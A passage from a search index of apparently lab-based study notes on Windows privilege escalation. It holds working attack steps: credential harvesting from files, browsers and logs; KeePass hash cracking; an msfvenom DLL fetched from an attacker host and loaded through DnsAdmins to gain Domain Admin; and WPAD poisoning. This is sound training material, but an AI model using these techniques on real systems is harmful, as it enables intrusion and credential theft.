Processes"},{"location":"windows_privesc/comm_with_ps/#enumerating-network-services","text":"Most common way to interact with processes is through a network socket (DNS, HTTP, SMB, etc.). Display Active Network Connections C:\\htb> netstat -ano The main thing to look for with Active Network Connections are entries listening on loopback addresses ( 127.0.0.1 and ::1 ) that are not listening on the IP Address (10.x.x.x) or broadcast (0.0.0.0, ::/0). The reason for this is network sockets on localhost are often insecure due to the thought that \"they aren't accessible to the network.\"","title":"Enumerating Network Services"},{"location":"windows_privesc/comm_with_ps/#named-pipes","text":"Listing Named Pipes with Pipelist C:\\htb> pipelist.exe /accepteula PowerShell to list named pipes using gci ( Get-ChildItem ). PS C:\\htb> gci \\\\.\\pipe\\ Reviewing LSASS Named Pipe Permissions C:\\htb> accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v","title":"Named Pipes"},{"location":"windows_privesc/credential_hunting/","text":"App Config Files \u00b6 Searching for Files PS C :\\ htb > findstr / SIM / C : \"password\" *. txt *. ini *. cfg *. config *. xml Sensitive IIS information such as credentials may be stored in a web.config file. For the default IIS website, this could be located at C:\\inetpub\\wwwroot\\web.config , but there may be multiple versions of this file in different locations, which we can search for recursively. Dictionary Files \u00b6 Chrome Dictionary Files Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline. PS C :\\ htb > gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password Password1234 ! Unattended Installation Files \u00b6 Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded. <?xml version=\"1.0\" encoding=\"utf-8\"?> <unattend xmlns= \"urn:schemas-microsoft-com:unattend\" > <settings pass= \"specialize\" > <component name= \"Microsoft-Windows-Shell-Setup\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <AutoLogon> <Password> <Value> local_4dmin_p@ss </Value> <PlainText> true </PlainText> </Password> <Enabled> true </Enabled> <LogonCount> 2 </LogonCount> <Username> Administrator </Username> </AutoLogon> <ComputerName> * </ComputerName> </component> </settings> Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file. PowerShell History File \u00b6 Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file: C:\\Users\\username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt. PS C :\\ htb > ( Get-PSReadLineOption ). HistorySavePath C :\\ Users \\ htb-student \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ PowerShell \\ PSReadLine \\ ConsoleHost_history . txt Once we know the file's location (the default path is above), we can attempt to read its contents using gc . PS C :\\ htb > gc ( Get-PSReadLineOption ). HistorySavePath dir cd Temp md backups cp c :\\ inetpub \\ wwwroot \\* .\\ backups \\ Set-ExecutionPolicy Bypass -Scope Process -Force ; [System.Net.ServicePointManager] :: SecurityProtocol = [System.Net.ServicePointManager] :: SecurityProtocol -bor 3072 ; iex (( New-Object System . Net . WebClient ). DownloadString ( 'https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1' )) . .\\ Get-IISsite . ps1 Get-IISsite -Server WEB02 -web \"Default Web Site\" wevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" / f : text / rd : true / u : WEB02 \\ administrator / p : 5erv3rAdmin ! / r : WEB02 One-liner to retrieve the contents of all Powershell history files that we can access as our current user. (assumes that the default save path is being used) PS C :\\ htb > foreach ( $user in (( ls C :\\ users ). fullname )){ cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue } dir cd Temp md backups cp c :\\ inetpub \\ wwwroot \\* .\\ backups \\ Set-ExecutionPolicy Bypass -Scope Process -Force ; [System.Net.ServicePointManager] :: SecurityProtocol = [System.Net.ServicePointManager] :: SecurityProtocol -bor 3072 ; iex (( New-Object System . Net . WebClient ). DownloadString ( 'https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1' )) . .\\ Get-IISsite . ps1 Get-IISsite -Server WEB02 -web \"Default Web Site\" wevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" / f : text / rd : true / u : WEB02 \\ administrator / p : 5erv3rAdmin ! / r : WEB02 PowerShell Credentials \u00b6 # Connect-VC.ps1 # Get-Credential | Export-Clixml -Path 'C:\\scripts\\pass.xml' $encryptedPassword = Import-Clixml -Path 'C:\\scripts\\pass.xml' $decryptedPassword = $encryptedPassword . GetNetworkCredential (). Password Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString Decrypting PowerShell Credentials PS C :\\ htb > $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml' PS C :\\ htb > $credential . GetNetworkCredential (). username bob PS C :\\ htb > $credential . GetNetworkCredential (). password Str0ng3ncryptedP @ss !","title":"Credential Hunting"},{"location":"windows_privesc/credential_hunting/#app-config-files","text":"Searching for Files PS C :\\ htb > findstr / SIM / C : \"password\" *. txt *. ini *. cfg *. config *. xml Sensitive IIS information such as credentials may be stored in a web.config file. For the default IIS website, this could be located at C:\\inetpub\\wwwroot\\web.config , but there may be multiple versions of this file in different locations, which we can search for recursively.","title":"App Config Files"},{"location":"windows_privesc/credential_hunting/#dictionary-files","text":"Chrome Dictionary Files Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline. PS C :\\ htb > gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password Password1234 !","title":"Dictionary Files"},{"location":"windows_privesc/credential_hunting/#unattended-installation-files","text":"Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded. <?xml version=\"1.0\" encoding=\"utf-8\"?> <unattend xmlns= \"urn:schemas-microsoft-com:unattend\" > <settings pass= \"specialize\" > <component name= \"Microsoft-Windows-Shell-Setup\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <AutoLogon> <Password> <Value> local_4dmin_p@ss </Value> <PlainText> true </PlainText> </Password> <Enabled> true </Enabled> <LogonCount> 2 </LogonCount> <Username> Administrator </Username> </AutoLogon> <ComputerName> * </ComputerName> </component> </settings> Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.","title":"Unattended Installation Files"},{"location":"windows_privesc/credential_hunting/#powershell-history-file","text":"Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file: C:\\Users\\username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt. PS C :\\ htb > ( Get-PSReadLineOption ). HistorySavePath C :\\ Users \\ htb-student \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ PowerShell \\ PSReadLine \\ ConsoleHost_history . txt Once we know the file's location (the default path is above), we can attempt to read its contents using gc . PS C :\\ htb > gc ( Get-PSReadLineOption ). HistorySavePath dir cd Temp md backups cp c :\\ inetpub \\ wwwroot \\* .\\ backups \\ Set-ExecutionPolicy Bypass -Scope Process -Force ; [System.Net.ServicePointManager] :: SecurityProtocol = [System.Net.ServicePointManager] :: SecurityProtocol -bor 3072 ; iex (( New-Object System . Net . WebClient ). DownloadString ( 'https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1' )) . .\\ Get-IISsite . ps1 Get-IISsite -Server WEB02 -web \"Default Web Site\" wevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" / f : text / rd : true / u : WEB02 \\ administrator / p : 5erv3rAdmin ! / r : WEB02 One-liner to retrieve the contents of all Powershell history files that we can access as our current user. (assumes that the default save path is being used) PS C :\\ htb > foreach ( $user in (( ls C :\\ users ). fullname )){ cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue } dir cd Temp md backups cp c :\\ inetpub \\ wwwroot \\* .\\ backups \\ Set-ExecutionPolicy Bypass -Scope Process -Force ; [System.Net.ServicePointManager] :: SecurityProtocol = [System.Net.ServicePointManager] :: SecurityProtocol -bor 3072 ; iex (( New-Object System . Net . WebClient ). DownloadString ( 'https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1' )) . .\\ Get-IISsite . ps1 Get-IISsite -Server WEB02 -web \"Default Web Site\" wevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" / f : text / rd : true / u : WEB02 \\ administrator / p : 5erv3rAdmin ! / r : WEB02","title":"PowerShell History File"},{"location":"windows_privesc/credential_hunting/#powershell-credentials","text":"# Connect-VC.ps1 # Get-Credential | Export-Clixml -Path 'C:\\scripts\\pass.xml' $encryptedPassword = Import-Clixml -Path 'C:\\scripts\\pass.xml' $decryptedPassword = $encryptedPassword . GetNetworkCredential (). Password Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString Decrypting PowerShell Credentials PS C :\\ htb > $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml' PS C :\\ htb > $credential . GetNetworkCredential (). username bob PS C :\\ htb > $credential . GetNetworkCredential (). password Str0ng3ncryptedP @ss !","title":"PowerShell Credentials"},{"location":"windows_privesc/dnsadmins/","text":"Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\\SYSTEM , so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. As detailed in this excellent post , the following attack can be performed when DNS is run on a Domain Controller DNS management is performed over RPC ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll registry key is populated When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access) An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials. Generating Malicious DLL hrmns@htb[/htb]$ msfvenom -p windows/x64/exec cmd = 'net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 313 bytes Final size of dll file: 5120 bytes Saved as: adduser.dll hrmns@htb[/htb]$ sudo python3 -m http.server 7777 [sudo] password for mrb3n: Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ... 10.129.43.9 - - [19/May/2021 19:22:46] \"GET /adduser.dll HTTP/1.1\" 200 - Downloading file to target PS C:\\htb> wget \"http://10.10.14.3:7777/adduser.dll\" -outfile \"adduser.dll\" Let's first see what happens if we use the dnscmd utility to load a custom DLL with a non-privileged user. C:\\htb> dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll DNS Server failed to reset registry property. Status = 5 (0x00000005) Command failed: ERROR_ACCESS_DENIED Only members of the DnsAdmins group are permitted to do this. C:\\htb> Get-ADGroupMember -Identity DnsAdmins distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL name : netadm objectClass : user objectGUID : 1a1ac159-f364-4805-a4bb-7153051a8c14 SamAccountName : netadm SID : S-1-5-21-669053619-2741956077-1013132368-1109 After confirming group membership in the DnsAdmins group, we can re-run the command to load a custom DLL. C:\\htb> dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll Registry property serverlevelplugindll successfully reset. Command completed successfully. We must specify the full path to our custom DLL or the attack will not work properly. With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do. First, we need our user's SID. C:\\htb> wmic useraccount where name=\"netadm\" get sid SID S-1-5-21-669053619-2741956077-1013132368-1109 Once we have the user's SID, we can use the sc command to check permissions on the service. Per this article , we can see that our user has RPWP permissions which translate to SERVICE_START and SERVICE_STOP . C:\\htb> sc.exe sdshow DNS D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) Stopping the DNS Service C:\\htb> sc stop dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x1 WAIT_HINT : 0x7530 The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly Starting the DNS Service C:\\htb> sc start dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 6960 FLAGS : If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back. C:\\htb> net group \"Domain Admins\" /dom Group name Domain Admins Comment Designated administrators of the domain Members ------------------------------------------------------------------------------- Administrator netadm The command completed successfully. Cleaning Up These steps must be taken from an elevated console with a local or domain admin account. The first step is confirming that the ServerLevelPluginDll registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly. C:\\htb> reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters GlobalQueryBlockList REG_MULTI_SZ wpad\\0isatap EnableGlobalQueryBlockList REG_DWORD 0x1 PreviousLocalHostname REG_SZ WINLPE-DC01.INLANEFREIGHT.LOCAL Forwarders REG_MULTI_SZ 1.1.1.1\\08.8.8.8 ForwardingTimeout REG_DWORD 0x3 IsSlave REG_DWORD 0x0 BootMethod REG_DWORD 0x3 AdminConfigured REG_DWORD 0x1 ServerLevelPluginDll REG_SZ adduser.dll Use the reg delete command to remove the key that points to our custom DLL. C:\\htb> reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll Delete the registry value ServerLevelPluginDll (Yes/No)? Y The operation completed successfully. Once this is done, we can start up the DNS service again. C:\\htb> sc.exe start dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 4984 FLAGS : If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an nslookup against the localhost or another host in the domain. C:\\htb> sc query dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 As detailed in this post , we could also utilize mimilib.dll from the creator of the Mimikatz tool to gain command execution by modifying the kdns.c file to execute a reverse shell one-liner or another command of our choosing. /* Benjamin DELPY `gentilkiwi` https://blog.gentilkiwi.com benjamin@gentilkiwi.com Licence : https://creativecommons.org/licenses/by/4.0/ */ #include \"kdns.h\" DWORD WINAPI kdns_DnsPluginInitialize ( PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction , PLUGIN_FREE_FUNCTION pDnsFreeFunction ) { return ERROR_SUCCESS ; } DWORD WINAPI kdns_DnsPluginCleanup () { return ERROR_SUCCESS ; } DWORD WINAPI kdns_DnsPluginQuery ( PSTR pszQueryName , WORD wQueryType , PSTR pszRecordOwnerName , PDB_RECORD * ppDnsRecordListHead ) { FILE * kdns_logfile ; #pragma warning(push) #pragma warning(disable:4996) if ( kdns_logfile = _wfopen ( L \"kiwidns.log\" , L \"a\" )) #pragma warning(pop) { klog ( kdns_logfile , L \"%S (%hu) \\n \" , pszQueryName , wQueryType ); fclose ( kdns_logfile ); system ( \"ENTER COMMAND HERE\" ); } return ERROR_SUCCESS ; } Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security , which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack. Disabling the Global Query Block List C:\\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local Next, we add a WPAD record pointing to our attack machine. C:\\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3","title":"DnsAdmins"},{"location":"windows_privesc/eventlog_readers/","text":"Suppose auditing of process creation events and corresponding command line values is enabled. In that case, this information is saved to the Windows security event log as event ID 4688: A new process has been created . Administrators or members of the Event Log Readers group have permission to access this log. It is conceivable that system administrators might want to add power users or developers into this group to perform certain tasks without having to grant them administrative access. Confirming Group Membership C:\\htb> net localgroup \"Event Log Readers\" Alias name Event Log Readers Comment Members of this group can read event logs from local machine Members ------------------------------------------------------------------------------- logger The command completed successfully. We can query Windows events from the command line using the wevtutil utility and the Get-WinEvent PowerShell cmdlet. Searching Security Logs Using wevtutil PS C:\\htb> wevtutil qe Security /rd:true /f:text | Select-String \"/user\" Process Command Line: net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword We can also specify alternate credentials for wevtutil using the parameters /u and /p. C:\\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \"/user\" For Get-WinEvent, the syntax is as follows. In this example, we filter for process creation events (4688), which contain /user in the process command line. Note: Searching the Security event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key HKLM\\System\\CurrentControlSet\\Services\\Eventlog\\Security . Membership in just the Event Log Readers group is not sufficient. Searching Security Logs Using Get-WinEvent PS C:\\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} CommandLine ----------- net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword cmdlet can also be run as another user with the -Credential parameter. PowerShell Operational log, may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.","title":"Event Log Readers"},{"location":"windows_privesc/further_credential_theft/","text":"Cmdkey Saved Credentials \u00b6 The cmdkey command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. C:\\htb> cmdkey /list Target: LegacyGeneric:target=TERMSRV/SQL01 Type: Generic User: inlanefreight\\bob When we attempt to RDP to the host, the saved credentials will be used. We can also attempt to reuse the credentials using runas to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as: PS C :\\ htb > runas / savecred / user : inlanefreight \\ bob \"COMMAND HERE\" Browser Credentials \u00b6 Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as SharpChrome to retrieve cookies and saved logins from Google Chrome. PS C :\\ htb > .\\ SharpChrome . exe logins / unprotect __ _ ( _ | _ _ . . _ . _ / | _ . _ _ . _ _ _ __ ) | | ( _ | | | _ ) \\ _ | | | ( _ ) | | | (/ _ | v1 . 7 . 0 [*] Action : Chrome Saved Logins Triage [*] Triaging Chrome Logins for current user [*] AES state key file : C :\\ Users \\ bob \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Local State [*] AES state key : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0 --- Chrome Credential ( Path : C :\\ Users \\ bob \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data ) --- file_path , signon_realm , origin_url , date_created , times_used , username , password C :\\ Users \\ bob \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data , https :// vc01 . inlanefreight . local /, https :// vc01 . inlanefreight . local / ui , 4 / 12 / 2021 5 : 16 : 52 PM , 13262735812597100 , bob @inlanefreight . local , Welcome1 Password Managers \u00b6 Extracting KeePass Hash python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$ *2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154 hrmns@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $ keepass $* 2 *60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1 Session..........: hashcat Status...........: Cracked Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES) Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154 Time.Started.....: Fri Aug 6 11:17:47 2021 (22 secs) Time.Estimated...: Fri Aug 6 11:18:09 2021 (0 secs) Guess.Base.......: File (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 6144/14344385 (0.04%) Rejected.........: 0/6144 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000 Candidates.#1....: 123456 -> iheartyou Started: Fri Aug 6 11:17:45 2021 Stopped: Fri Aug 6 11:18:11 2021 Email \u00b6 If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as \"pass,\" \"creds,\" \"credentials,\" etc. using MailSniper . Others \u00b6 When all else fails, we can run the LaZagne tool in an attempt to retrieve credentials from a wide variety of software. PS C :\\ htb > .\\ lazagne . exe all |====================================================================| | | | The LaZagne Project | | | | ! BANG BANG ! | | | |====================================================================| ########## User: jordan ########## ------------------- Winscp passwords ----------------- [+] Password found !!! URL : transfer . inlanefreight . local Login : root Password : Summer2020 ! Port : 22 ------------------- Credman passwords ----------------- [+] Password found !!! URL : dev01 . dev . inlanefreight . local Login : jordan_adm Password : ! Q A Z z a q 1 [+] 2 passwords have been found . For more information launch it again with the -v option elapsed time = 5 . 50499987602 SessionGopher to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. We need local admin access to retrieve stored session information for every user in HKEY_USERS , but it is always worth running as our current user to see if we can find any useful credentials. PS C :\\ htb > .\\ SessionGopher . ps1 PS C :\\ Tools > Invoke-SessionGopher -Target WINLPE-SRV01 o_ / \". SessionGopher ,\" _ - \" ,\" m m ..+ ) Brandon Arvanaghi ` m .. m Twitter : @arvanaghi | arvanaghi . com [+] Digging on WINLPE-SRV01 ... WinSCP Sessions Source : WINLPE-SRV01 \\ htb-student Session : Default% 20Settings Hostname : Username : Password : PuTTY Sessions Source : WINLPE-SRV01 \\ htb-student Session : nix03 Hostname : nix03 . inlanefreight . local SuperPuTTY Sessions Source : WINLPE-SRV01 \\ htb-student SessionId : NIX03 SessionName : NIX03 Host : nix03 . inlanefreight . local Username : srvadmin ExtraArgs : Port : 22 Putty Session : Default Settings Wifi Passwords \u00b6 If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to. C:\\htb> netsh wlan show profile Profiles on interface Wi-Fi: Group policy profiles (read only) --------------------------------- <None> User profiles ------------- All User Profile : Smith Cabin All User Profile : Bob's iPhone All User Profile : EE_Guest All User Profile : EE_Guest 2.4 All User Profile : ilfreight_corp Depending on the network configuration, we can retrieve the pre-shared key ( Key Content below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources. C:\\htb> netsh wlan show profile ilfreight_corp key=clear Profile ilfreight_corp on interface Wi-Fi: ======================================================================= Applied: All User Profile Profile information ------------------- Version : 1 Type : Wireless LAN Name : ilfreight_corp Control options : Connection mode : Connect automatically Network broadcast : Connect only if this network is broadcasting AutoSwitch : Do not switch to other networks MAC Randomization : Disabled Connectivity settings --------------------- Number of SSIDs : 1 SSID name : \"ilfreight_corp\" Network type : Infrastructure Radio type : [ Any Radio Type ] Vendor extension : Not present Security settings ----------------- Authentication : WPA2-Personal Cipher : CCMP Authentication : WPA2-Personal Cipher : GCMP Security key : Present Key Content : ILFREIGHTWIFI-CORP123908! Cost settings ------------- Cost : Unrestricted Congested : No Approaching Data Limit : No Over Data Limit : No Roaming : No Cost Source : Default","title":"Further Credential Theft"},{"location":"windows_privesc/further_credential_theft/#cmdkey-saved-credentials","text":"The cmdkey command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. C:\\htb> cmdkey /list Target: LegacyGeneric:target=TERMSRV/SQL01 Type: Generic User: inlanefreight\\bob When we attempt to RDP to the host, the saved credentials will be used. We can also attempt to reuse the credentials using runas to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as: PS C :\\ htb > runas / savecred / user : inlanefreight \\ bob \"COMMAND HERE\"","title":"Cmdkey Saved Credentials"},{"location":"windows_privesc/further_credential_theft/#browser-credentials","text":"Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as SharpChrome to retrieve cookies and saved logins from Google Chrome. PS C :\\ htb > .\\ SharpChrome . exe logins / unprotect __ _ ( _ | _ _ . . _ . _ / | _ . _ _ . _ _ _ __ ) | | ( _ | | | _ ) \\ _ | | | ( _ ) | | | (/ _ | v1 . 7 . 0 [*] Action : Chrome Saved Logins Triage [*] Triaging Chrome Logins for current user [*] AES state key file : C :\\ Users \\ bob \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Local State [*] AES state key : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0 --- Chrome Credential ( Path : C :\\ Users \\ bob \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data ) --- file_path , signon_realm , origin_url , date_created , times_used , username , password C :\\ Users \\ bob \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data , https :// vc01 . inlanefreight . local /, https :// vc01 . inlanefreight . local / ui , 4 / 12 / 2021 5 : 16 : 52 PM , 13262735812597100 , bob @inlanefreight . local , Welcome1","title":"Browser Credentials"},{"location":"windows_privesc/further_credential_theft/#password-managers","text":"Extracting KeePass Hash python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$ *2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154 hrmns@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $ keepass $* 2 